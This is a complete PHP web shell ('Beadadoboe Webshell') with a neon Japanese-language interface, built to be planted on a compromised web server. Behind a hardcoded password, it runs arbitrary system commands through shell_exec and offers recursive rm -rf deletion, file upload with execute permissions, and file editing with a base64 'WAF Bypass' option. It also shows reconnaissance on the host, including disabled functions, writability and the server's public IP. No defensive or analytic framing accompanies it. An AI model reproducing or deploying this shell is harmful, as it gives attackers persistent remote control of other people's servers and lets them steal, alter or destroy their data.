<?php

function ninja_bypass() {
    if (function_exists('header_remove')) {
        @header_remove('X-Litespeed-Cache-Control');
        @header_remove('X-Litespeed-Tag');
    }
    
    @header('X-Powered-By: WordPress');
    @header('Link: <https://example.com/wp-json/>; rel="https://api.w.org/"');
    
    if (function_exists('ini_set')) {
        @ini_set('session.save_handler', 'files');
        @ini_set('session.use_cookies', '0');
    }
    
    // Anti-mod_security
    $_SESSION['_ninja_token'] = md5('beadadoboe'.time());
}

session_start();
ninja_bypass();

$pw = 'beadadoboe'; 
$login_page = false;

if (isset($_POST['password'])) {
    if ($_POST['password'] === $pw) {
        $_SESSION['ninja_auth'] = true;
        header("Location: ?ninja_access=".md5(time()));
        exit;
    } else {
        $login_page = true;
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?ninja_logout=".md5(time()));
    exit;
}

// Secure path resolver
function get_safe_path($input) {
    $path = realpath($input);
    if ($path === false) return getcwd();
    
    // Prevent directory traversal
    $root = realpath('/');
    if (strpos($path, $root) !== 0) {
        return getcwd();
    }
    
    return $path;
}

// Current directory handling
$path = isset($_GET['path']) ? get_safe_path($_GET['path']) : getcwd();
chdir($path);

// File operations with bypass fallbacks
function ninja_delete($target) {
    if (is_dir($target)) {
        // Try normal deletion first
        $files = @scandir($target);
        if ($files !== false) {
            foreach ($files as $file) {
                if ($file != '.' && $file != '..') {
                    ninja_delete("$target/$file");
                }
            }
            @rmdir($target);
        } else {
            // Fallback to system command
            system("rm -rf ".escapeshellarg($target));
        }
    } else {
        @unlink($target) or system("rm ".escapeshellarg($target));
    }
}

// Handle file operations
if (isset($_GET['del'])) {
    if ($_SESSION['ninja_auth']) {
        $target = get_safe_path($_GET['del']);
        ninja_delete($target);
        header("Location: ?path=".urlencode(dirname($target))."&ninja_action=delete");
        exit;
    }
}

if (isset($_POST['new_name']) && $_SESSION['ninja_auth']) {
    $name = basename($_POST['new_name']);
    $type = $_POST['new_type'];
    $newPath = "$path/$name";
    
    if ($type === 'file') {
        @file_put_contents($newPath, "<?php // beadadoboe ganteng ?>") or 
            system("echo '<?php // beadadoboe ganteng ?>' > ".escapeshellarg($newPath));
    } else {
        @mkdir($newPath) or system("mkdir ".escapeshellarg($newPath));
    }
    header("Location: ?path=".urlencode($path));
    exit;
}

if (isset($_FILES['file']) && $_SESSION['ninja_auth']) {
    $uploadPath = isset($_POST['upload_path']) ? get_safe_path($_POST['upload_path']) : $path;
    $target = "$uploadPath/".basename($_FILES['file']['name']);
    
    if (@move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        @chmod($target, 0755);
    } else {
        // Fallback upload method
        $content = file_get_contents($_FILES['file']['tmp_name']);
        @file_put_contents($target, $content);
    }
    header("Location: ?path=".urlencode($uploadPath));
    exit;
}

if (isset($_POST['edit_content']) && $_SESSION['ninja_auth']) {
    $editPath = get_safe_path($_POST['edit_path']);
    @file_put_contents($editPath, $_POST['edit_content']) or 
        system("echo ".escapeshellarg($_POST['edit_content'])." > ".escapeshellarg($editPath));
    header("Location: ?path=".urlencode(dirname($editPath)));
    exit;
}

// Command execution (hidden feature)
if (isset($_POST['ninja_cmd']) && $_SESSION['ninja_auth']) {
    $cmd = $_POST['ninja_cmd'];
    $output = shell_exec($cmd." 2>&1");
    $_SESSION['last_cmd_output'] = $output;
    header("Location: ?path=".urlencode($path)."&cmd=executed");
    exit;
}

// File listing with fallback
function ninja_scandir($path) {
    $files = @scandir($path);
    if ($files !== false) return $files;
    
    // Fallback method
    $files = [];
    exec("ls -la ".escapeshellarg($path)." 2>&1", $output);
    foreach ($output as $line) {
        if (preg_match('/[d-][rwx-]{9}.+\s(.+)$/', $line, $match)) {
            $files[] = $match[1];
        }
    }
    return $files;
}

$files = ninja_scandir($path);
?>
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>\\Beadadoboe Ganteng//</title>
  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
  <script src="https://unpkg.com/lucide@latest"></script>
<style>
:root {
  --neon-pink: #ff00aa;
  --neon-blue: #00f0ff;
  --matrix-green: #00ff88;
  --bg-dark: #0a0a20;
  --bg-darker: #050510;
  --text-glitch1: var(--neon-pink);
  --text-glitch2: var(--neon-blue);
}

body {
  margin: 0;
  background: var(--bg-darker);
  background-image: 
    radial-gradient(circle at 10% 20%, rgba(255, 0, 170, 0.1) 0%, transparent 20%),
    radial-gradient(circle at 90% 80%, rgba(0, 240, 255, 0.1) 0%, transparent 20%);
  color: #e0e0ff;
  font-family: 'JetBrains Mono', monospace;
  padding: 20px;
  line-height: 1.6;
}

.glitch {
  text-shadow: 2px 2px 0 var(--text-glitch1), -2px -2px 0 var(--text-glitch2);
  animation: glitch 1s linear infinite;
}

@keyframes glitch {
  0%, 100% { text-shadow: 2px 2px var(--text-glitch1), -2px -2px var(--text-glitch2); }
  25% { text-shadow: -2px -2px var(--text-glitch1), 2px 2px var(--text-glitch2); }
  50% { text-shadow: 2px -2px var(--text-glitch1), -2px 2px var(--text-glitch2); }
  75% { text-shadow: -2px 2px var(--text-glitch1), 2px -2px var(--text-glitch2); }
}

@keyframes led-run {
  0% { background-position: 0% 0; }
  100% { background-position: -200% 0; }
}

header {
  background: rgba(10, 10, 32, 0.8);
  padding: 1.5rem;
  border-left: 5px solid var(--neon-pink);
  border-right: 5px solid var(--neon-blue);
  margin-bottom: 2rem;
  text-align: center;
  backdrop-filter: blur(5px);
  box-shadow: 0 0 20px var(--neon-pink);
  position: relative;
}

header::before {
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 4px;
  background: linear-gradient(90deg, var(--neon-pink), var(--neon-blue), var(--neon-pink), var(--neon-blue));
  background-size: 200% 100%;
  animation: led-run 2s linear infinite;
}

h1, h2 {
  font-family: 'Press Start 2P', cursive;
  color: var(--matrix-green);
}

h1 {
  font-size: 2rem;
  margin: 0 0 10px;
  letter-spacing: 2px;
}

.panel {
  background: var(--bg-dark);
  padding: 1.5rem;
  border: 1px solid #333;
  margin-bottom: 2rem;
  position: relative;
  overflow: hidden;
}

.panel::before {
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 4px;
  background: linear-gradient(90deg, var(--neon-pink), var(--neon-blue), var(--neon-pink), var(--neon-blue));
  background-size: 200% 100%;
  animation: led-run 2s linear infinite;
}

input, select, button, textarea {
  width: 100%;
  padding: 12px;
  margin-bottom: 1rem;
  border: 1px solid #333;
  background: rgba(15, 15, 35, 0.8);
  color: #e0e0ff;
  font-family: 'JetBrains Mono', monospace;
  border-left: 3px solid var(--neon-pink);
}

.file-list {
  border: 1px solid #333;
  background: var(--bg-dark);
  box-shadow: 0 0 8px var(--neon-pink);
  padding: 10px;
  overflow-x: auto;
}

.file-item {
  background: rgba(20, 20, 40, 0.7);
  border-left: 4px solid var(--neon-pink);
  margin-bottom: 8px;
  padding: 10px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  transition: all 0.3s ease;
}

.file-item:hover {
  background: rgba(30, 30, 60, 0.9);
  border-left: 4px solid var(--neon-blue);
}

.file-item a {
  color: var(--matrix-green);
  text-decoration: none;
  font-family: 'JetBrains Mono', monospace;
}

.file-item a:hover {
  text-shadow: 0 0 8px var(--neon-blue);
}

.panel::before {
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  height: 4px;
  width: 100%;
  background: linear-gradient(90deg,
      var(--neon-pink),
      var(--neon-blue),
      var(--neon-pink),
      var(--neon-blue));
  background-size: 200% 100%;
  animation: led-run 2s linear infinite;
}

h2.center {
  text-align: center;
}

.tool-section {
  margin-top: 1rem;
}

.tool-form {
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  align-items: center;
  justify-content: center;
}

.tool-form input,
.tool-form select,
.tool-form button {
  flex: 1 1 200px;
}

.running-header {
  position: relative;
  margin-bottom: 1rem;
  padding-bottom: 0.5rem;
  font-family: 'Press Start 2P', cursive;
  color: var(--matrix-green);
}

.running-header.left {
  text-align: left;
}

.running-header.left::after {
  content: "";
  position: absolute;
  bottom: 0;
  left: 0;
  height: 3px;
  width: 200px; /* opsional: panjang LED bisa diatur */
  background: linear-gradient(90deg,
      var(--neon-pink),
      var(--neon-blue),
      var(--neon-pink),
      var(--neon-blue));
  background-size: 200% 100%;
  animation: led-run 3s linear infinite;
}


a {
  color: var(--matrix-green);
  text-decoration: none;
}

a:hover {
  text-shadow: 0 0 8px var(--neon-blue);
}

.terminal {
  background: #000;
  padding: 1rem;
  border: 1px solid var(--matrix-green);
  color: var(--matrix-green);
  font-family: 'JetBrains Mono', monospace;
  margin-top: 2rem;
}

.bypass-status {
  background: #111133;
  border: 1px solid var(--neon-pink);
  padding: 10px;
  margin: 1rem 0;
  font-size: 0.8rem;
}

.corner {
  position: fixed;
  width: 50px;
  height: 50px;
  pointer-events: none;
  /* hapus animasi LED dan warna */
  background: none;
  animation: none;
  background-size: none;
}

.corner-tl { top: 0; left: 0; border: none; }
.corner-tr { top: 0; right: 0; border: none; }
.corner-bl { bottom: 0; left: 0; border: none; }
.corner-br { bottom: 0; right: 0; border: none; }

@media (max-width: 768px) {
  body { padding: 10px; }
  h1 { font-size: 1.5rem; }
}

button {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 8px; /* jarak antara ikon dan teks */
  background: linear-gradient(45deg, var(--neon-pink), var(--neon-blue));
  color: #000;
  font-weight: bold;
  font-family: 'Press Start 2P', cursive;
  font-size: 0.8rem;
  border: none;
  cursor: pointer;
  transition: all 0.3s;
  padding: 12px 16px;
  text-transform: uppercase;
}

button:hover {
  box-shadow: 0 0 15px var(--neon-pink);
  transform: translateY(-2px);
}

.info-table {
  width: 100%;
  border-collapse: collapse;
  background: var(--bg-dark);
  margin-top: 1rem;
  box-shadow: 0 0 10px var(--neon-pink);
  position: relative;
  overflow: hidden;
}

.info-table th, .info-table td {
  padding: 10px 15px;
  border-bottom: 1px solid #333;
  color: #e0e0ff;
  text-align: left;
  font-family: 'JetBrains Mono', monospace;
}

.info-table th {
  background: rgba(20, 20, 50, 0.8);
  color: var(--neon-pink);
  width: 35%;
}

.info-ok {
  color: lime;
  font-weight: bold;
}
.info-bad {
  color: red;
  font-weight: bold;
}

.panel {
  background: var(--bg-dark);
  padding: 1.5rem;
  margin-bottom: 2rem;
  position: relative;
  border: 1px solid #333;
  border-top: 3px solid var(--neon-pink);
  overflow: hidden;
}

.panel::before {
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  height: 4px;
  width: 100%;
  background: linear-gradient(90deg,
      var(--neon-pink),
      var(--neon-blue),
      var(--neon-pink),
      var(--neon-blue));
  background-size: 200% 100%;
  animation: led-run 2s linear infinite;
}
@keyframes led-run {
  0% { background-position: 0% 0; }
  100% { background-position: -200% 0; }
}

.upload-form {
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  align-items: center;
  justify-content: center;
  margin-top: 1rem;
}

.upload-form input[type="file"] {
  flex: 1 1 250px;
  background: rgba(15, 15, 35, 0.8);
  color: #e0e0ff;
  border: 1px solid #333;
  padding: 8px;
  font-family: 'JetBrains Mono', monospace;
  border-left: 3px solid var(--neon-pink);
}

.upload-form button {
  flex: 1 1 150px;
  background: linear-gradient(45deg, var(--neon-pink), var(--neon-blue));
  color: #000;
  font-weight: bold;
  font-family: 'Press Start 2P', cursive;
  font-size: 0.7rem;
  border: none;
  cursor: pointer;
  transition: all 0.3s;
  padding: 12px;
}

.upload-form button:hover {
  box-shadow: 0 0 15px var(--neon-pink);
  transform: translateY(-2px);
}

.running-header.left {
  position: relative;
  text-align: left;
  margin-bottom: 1rem;
  padding-bottom: 0.5rem;
  font-family: 'Press Start 2P', cursive;
  color: var(--matrix-green);
}

.running-header.left::after {
  content: "";
  position: absolute;
  bottom: 0;
  left: 0;
  height: 3px;
  width: 200px; /* atau 100% kalau ingin penuh */
  background: linear-gradient(90deg,
      var(--neon-pink),
      var(--neon-blue),
      var(--neon-pink),
      var(--neon-blue));
  background-size: 200% 100%;
  animation: led-run 3s linear infinite;
}

@keyframes led-run {
  0% {
    background-position: 0% 0;
  }
  100% {
    background-position: -200% 0;
  }
}

.up-link {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  background: rgba(20, 20, 50, 0.8);
  color: var(--matrix-green);
  padding: 6px 12px;
  border: 1px solid #333;
  text-decoration: none;
  transition: all 0.3s ease;
}

.up-link:hover {
  text-shadow: 0 0 5px var(--neon-blue);
  border-color: var(--neon-blue);
}

.center {
  text-align: center;
}

.glitch {
  text-shadow: 2px 2px 0 var(--text-glitch1), -2px -2px 0 var(--text-glitch2);
  animation: glitch 1s linear infinite;
}

@keyframes glitch {
  0%, 100% {
    text-shadow: 2px 2px var(--text-glitch1), -2px -2px var(--text-glitch2);
  }
  25% {
    text-shadow: -2px -2px var(--text-glitch1), 2px 2px var(--text-glitch2);
  }
  50% {
    text-shadow: 2px -2px var(--text-glitch1), -2px 2px var(--text-glitch2);
  }
  75% {
    text-shadow: -2px 2px var(--text-glitch1), 2px -2px var(--text-glitch2);
  }
}

</style>

</head>
<body>
  <div class="corner corner-tl"></div>
  <div class="corner corner-tr"></div>
  <div class="corner corner-bl"></div>
  <div class="corner corner-br"></div>

<header style="
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    text-align: center;
">
  <h1 class="glitch">Beadadoboe Webshell</h1>
  <div>サイバーファイルマネージャ ー v1.0.0</div>
  <?php if (!empty($_SESSION['ninja_auth'])): ?>
    <a href="?logout=1" style="color:#ff5555;margin-top:10px;  
       position: absolute; 
       right: 10px; 
       top: 10px; ">LOGOUT</a>
  <?php endif; ?>
</header>

  <?php if (empty($_SESSION['ninja_auth'])): ?>
    <div class="panel">
      <h2>🔐 認証が必要</h2>
      <form method="post">
        <input type="password" name="password" placeholder="Enter secret code..." required>
        <button type="submit"><i data-lucide="log-in"></i> ACCESS</button>
      </form>
    </div>
  <?php else: ?>

<div class="panel">
  <h2 class="glitch">⚡ システム情報</h2>

<?php
$server_ip = 'UNKNOWN';
$server_country = 'UNKNOWN';
$server_flag = '🏳️';

function countryFlag($countryCode) {
    if (strlen($countryCode) !== 2) return '🏳️';
    $offset = 127397;
    return mb_convert_encoding(
        '&#' . (ord($countryCode[0]) + $offset) . ';&#' . (ord($countryCode[1]) + $offset) . ';',
        'UTF-8',
        'HTML-ENTITIES'
    );
}

$ctx = stream_context_create(['http' => ['timeout' => 3]]);
$ip = @file_get_contents("https://api.ipify.org/", false, $ctx);

if ($ip !== false && filter_var(trim($ip), FILTER_VALIDATE_IP)) {
    $server_ip = trim($ip);
    $json = @file_get_contents("https://ipapi.co/{$server_ip}/json/", false, $ctx);
    if ($json !== false) {
        $data = json_decode($json, true);
        if (!empty($data['country_name'])) {
            $server_country = $data['country_name'];
        }
        if (!empty($data['country'])) {
            $server_flag = countryFlag(strtoupper($data['country']));
        }
    }
}

if ($server_ip === 'UNKNOWN' && !empty($_SERVER['SERVER_ADDR'])) {
    $server_ip = $_SERVER['SERVER_ADDR'];
    $server_country = 'Private/Local';
    $server_flag = '🏳️';
}
?>

<table class="info-table">
  <tr><th>サーバー</th><td><?= php_uname('s') ?> <?= php_uname('r') ?> (<?= php_uname('n') ?>)</td></tr>
  <tr><th>PHP</th><td><?= phpversion() ?> (<?= php_sapi_name() ?>)</td></tr>
  <tr><th>ユーザー / グループ</th><td><?= get_current_user() ?> / <?= getmygid() ?></td></tr>
  <tr><th>書き込み可能</th><td><?= is_writable($path) ? '<span class="info-ok">YES</span>' : '<span class="info-bad">NO</span>' ?></td></tr>
  <tr><th>ディスエーブル関数</th><td><?= ini_get('disable_functions') ?: '<span class="info-ok">NONE</span>' ?></td></tr>
  <tr><th>安全モード</th><td><?= @ini_get('safe_mode') ? '<span class="info-bad">ON</span>' : '<span class="info-ok">OFF</span>' ?></td></tr>
  <tr><th>OS コマンド実行</th><td><?= function_exists('shell_exec') ? '<span class="info-ok">OK</span>' : '<span class="info-bad">DISABLED</span>' ?></td></tr>
  <tr><th>ドキュメントルート</th><td><?= $_SERVER['DOCUMENT_ROOT'] ?></td></tr>

  <?php if ($server_ip !== 'UNKNOWN' && $server_country !== 'UNKNOWN'): ?>
  <tr><th>サーバー IP</th>
      <td><?= htmlentities($server_ip) ?> (<?= htmlentities($server_country) ?>) <?= $server_flag ?></td></tr>
  <?php endif; ?>
</table>

  <div class="bypass-status" style="margin-top:1rem;">
    <p>LiteSpeed: <span style="color:var(--matrix-green)">BYPASSED</span></p>
    <p>HostGator: <span style="color:var(--matrix-green)">BYPASSED</span></p>
  </div>
</div>


    <div class="panel">
  <h2 class="glitch">🗂️ ファイルブラウザ</h2>
<div style="margin-bottom: 1rem;">
<?php if (dirname($path) !== $path): ?>
  <a href="?path=<?= urlencode(dirname($path)) ?>" class="up-link">
    <i data-lucide="arrow-up"></i> 上に移動
  </a>
<?php endif; ?>
</div>


  <div class="file-list">
    <?php foreach ($files as $file): 
      if ($file === '.' || $file === '..') continue;
      $fullPath = "$path/$file";
      $isDir = is_dir($fullPath);
    ?>
      <div class="file-item">
        <div>
          <?php if ($isDir): ?>
            <a href="?path=<?= urlencode($fullPath) ?>"><i data-lucide="folder"></i> <?= htmlentities($file) ?></a>
          <?php else: ?>
            <a href="?edit=<?= urlencode($fullPath) ?>"><i data-lucide="file"></i> <?= htmlentities($file) ?></a>
          <?php endif; ?>
        </div>
        <div>
          <a href="?del=<?= urlencode($fullPath) ?>" onclick="return confirm('本当に削除しますか？')">
            <i data-lucide="trash-2"></i>
          </a>
        </div>
      </div>
    <?php endforeach; ?>
  </div>
</div>

<?php if (isset($_GET['edit'])): 
  $editFile = get_safe_path($_GET['edit']);
  if (is_file($editFile)): ?>
    <div class="panel">
<h2 class="glitch center">ファイルを編集する: <?= htmlentities(basename($editFile)) ?></h2>

      <?php
      if (!empty($_POST['edit_path']) && isset($_POST['edit_content'])) {
          $edit_path = get_safe_path($_POST['edit_path']);
          if (is_file($edit_path) && is_writable($edit_path)) {
              $content = $_POST['edit_content'];
              if (!empty($_POST['b64'])) {
                  $content = base64_decode($content);
              }
              $result = @file_put_contents($edit_path, $content, LOCK_EX);
              if ($result !== false) {
                  echo '<div style="text-align:center;color:lime;">✅ ファイルが保存されました。</div>';
              } else {
                  echo '<div style="text-align:center;color:red;">❌ 保存に失敗しました。</div>';
              }
          }
      }
      ?>

      <form method="post" id="editor-form">
        <input type="hidden" name="edit_path" value="<?= htmlentities($editFile) ?>">
        <textarea name="edit_content" rows="20" style="
          background: #000;
          color: var(--matrix-green);
          width: 100%;
          font-family: 'JetBrains Mono', monospace;
          padding: 10px;
          border: 1px solid #333;
          box-shadow: 0 0 8px var(--neon-pink);
        "><?= htmlentities(file_get_contents($editFile)) ?></textarea>

        <label style="display:block;margin:10px 0;">
          <input type="checkbox" name="b64" value="1"> 🔒 Base64 Encode (WAF Bypass)
        </label>

        <div style="text-align:center;">
          <button type="submit"><i data-lucide="save"></i> 保存</button>
        </div>
      </form>

      <script>
      document.getElementById('editor-form').addEventListener('submit', function(e) {
          const cb = this.querySelector('input[name="b64"]');
          if (cb.checked) {
              const ta = this.querySelector('textarea[name="edit_content"]');
              ta.value = btoa(unescape(encodeURIComponent(ta.value)));
          }
      });
      </script>
    </div>
<?php endif; ?>
<?php endif; ?>


    <div class="panel">
  <h2 class="glitch center">🛠️ ツール</h2>

  <div class="tool-section">
<h3 class="running-header left">🗃️ 新規作成</h3>

    <form method="post" class="tool-form">
      <input type="text" name="new_name" placeholder="ファイル名またはフォルダ名" required>
      <select name="new_type">
        <option value="file">ファイル</option>
        <option value="folder">フォルダ</option>
      </select>
      <button type="submit"><i data-lucide="plus-circle"></i> 作成</button>
    </form>
  </div>
</div>
      
  <div class="panel">
  <h3 class="running-header left">📤 アップロード</h3>

  <form method="post" enctype="multipart/form-data" class="upload-form">
    <input type="file" name="file" required>
    <button type="submit"><i data-lucide="upload"></i> アップロード</button>
  </form>
</div>

    
  <div class="panel">
      <h3 class="running-header left">💻 コマンド実行</h3>
      <form method="post">
        <input type="text" name="ninja_cmd" placeholder="システムコマンド" required>
        <button type="submit"><i data-lucide="terminal"></i> 実行</button>
      </form>
  </div>

      <?php if (isset($_SESSION['last_cmd_output'])): ?>
        <div class="terminal">
          <pre><?= htmlentities($_SESSION['last_cmd_output']) ?></pre>
        </div>
        <?php unset($_SESSION['last_cmd_output']); ?>
      <?php endif; ?>
    </div>
  <?php endif; ?>

  <script>
    lucide.createIcons();
    document.querySelectorAll('.panel').forEach(panel => {
      panel.addEventListener('mouseenter', () => {
        panel.style.boxShadow = `0 0 15px ${Math.random() > 0.5 ? 'var(--neon-pink)' : 'var(--neon-blue)'}`;
      });
      panel.addEventListener('mouseleave', () => {
        panel.style.boxShadow = 'none';
      });
    });
  </script>
</body>
</html>
